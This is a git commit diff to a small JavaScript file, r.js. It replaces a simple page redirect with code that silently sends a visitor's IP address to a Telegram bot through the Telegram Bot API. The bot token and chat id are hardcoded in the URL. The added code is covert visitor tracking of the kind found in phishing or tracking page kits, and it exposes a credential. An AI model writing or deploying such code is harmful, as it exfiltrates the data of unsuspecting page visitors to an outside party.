9ea98fd7823fa8a3ffd5a41edb142b0863014aa8
samat2030 <121757988+samat2030@users.noreply.github.com>
2023-01-21 18:57:11 +0300

    Update r.js

--- r.js
+++ r.js
@@ -1,1 +1,5 @@
-window.location.href = "rr.html"
+var logbot = 'https://api.telegram.org/bot5817673032:AAEkDq1mZv3Qo2tG_f33MsFzoUuzrSfo4DQ/sendMessage?chat_id=1461033970&text=' + IP;
+let x = new XMLHttpRequest();
+x.open("GET", logbot, true);
+x.send();
+
